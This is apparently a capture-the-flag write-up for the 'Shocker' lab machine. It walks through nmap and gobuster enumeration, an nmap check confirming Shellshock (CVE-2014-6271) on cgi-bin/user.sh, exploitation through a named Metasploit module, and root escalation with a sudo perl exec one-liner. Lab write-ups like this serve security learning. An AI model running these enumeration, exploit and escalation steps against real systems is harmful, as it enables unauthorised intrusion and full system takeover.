>[!tldr] Shocker, while fairly simple overall, demonstrates the severity of the renowned #Shellshock-exploit, which affected millions of public-facing servers.

---
1. I start off with a `nmap`
	`nmap -sT 10.129.7.10 -p-`
	-> `80` and `2222`
	`nmap -sCV 10.129.7.10 -p80,2222`
	->
```shell
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
	
2. I then `curl -I <target>` to find more info about apache
```shell
HTTP/1.1 200 OK
Date: Thu, 25 Jun 2026 21:14:23 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
ETag: "89-559ccac257884"
Accept-Ranges: bytes
Content-Length: 137
Vary: Accept-Encoding
Content-Type: text/html
```
- The version of `apache` does have `CVE-2016-4979` which we might use later.
	
3. I now will look at the website with `ZAP` and run a automated pentest scan. 
	1. The automated scan did not find anything of note
4. I then decided to use `gobuster` to find more directories
	`gobuster dir -k -u http://10.129.7.10/ -w Tools/SecLists-2026.1/Discovery/Web-Content/common.txt -x txt,php,html -t 100`
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess.html       (Status: 403) [Size: 300]
.hta.txt             (Status: 403) [Size: 294]
.htpasswd.txt        (Status: 403) [Size: 299]
.htpasswd.php        (Status: 403) [Size: 299]
.htpasswd.html       (Status: 403) [Size: 300]
.hta.html            (Status: 403) [Size: 295]
.htaccess.txt        (Status: 403) [Size: 299]
.htaccess            (Status: 403) [Size: 295]
.hta.php             (Status: 403) [Size: 294]
.htpasswd            (Status: 403) [Size: 295]
.htaccess.php        (Status: 403) [Size: 299]
.hta                 (Status: 403) [Size: 290]
cgi-bin/.html        (Status: 403) [Size: 299]
cgi-bin/             (Status: 403) [Size: 294]
index.html           (Status: 200) [Size: 137]
index.html           (Status: 200) [Size: 137]
server-status        (Status: 403) [Size: 299]
```
- Findings:
	- First i learn that the website uses `html` instead of php
	- I decided to skip the .hta stuff 
	- `cgi-bin/` seems interesting...
- Now i want to enumerate through that directory (I had to add `.sh`)
	`gobuster dir -k -u http://10.129.7.10/cgi-bin/ -w Tools/SecLists-2026.1/Discovery/Web-Content/common.txt -x txt,php,html,sh -t 100`
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 298]
.hta.html            (Status: 403) [Size: 303]
.hta.sh              (Status: 403) [Size: 301]
.htaccess.html       (Status: 403) [Size: 308]
.htaccess.php        (Status: 403) [Size: 307]
.hta.php             (Status: 403) [Size: 302]
.hta.txt             (Status: 403) [Size: 302]
.htaccess            (Status: 403) [Size: 303]
.htaccess.sh         (Status: 403) [Size: 306]
.htpasswd            (Status: 403) [Size: 303]
.htaccess.txt        (Status: 403) [Size: 307]
.htpasswd.sh         (Status: 403) [Size: 306]
.htpasswd.html       (Status: 403) [Size: 308]
.htpasswd.php        (Status: 403) [Size: 307]
.htpasswd.txt        (Status: 403) [Size: 307]
user.sh              (Status: 200) [Size: 118]
```
- `user.sh` was found, so ill check that out with `ZAP`
	
5. Through `ZAP` I don't see anything that stands out so i search up what `cgi-bin/user.sh` is and [hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html) writes about `shellshock`
	- Test: `nmap 10.129.7.10 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh`
```shell
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
```
	
6. It is vulnerable, so now we can exploit with `shellshock` or `CVE-2014-6271`. On metasploit its `use multi/http/apache_mod_cgi_bash_env_exec`.
	- Through `msfconsole` we now have a shell 
	- Inside `/home/shelly/user.txt` we find the User Flag
	- User Flag -> `[REDACTED_FLAG]`
7. Now for the root flag i need privilege escalation
	1. `sudo -l` -> `/usr/bin/perl`
	I then find `sudo perl -e 'exec "/bin/bash"'` on `https://gtfobins.org/`
	and i got `root`
	- From within `/root/root.txt` we get the root flag
	- Root -> `[REDACTED_FLAG]`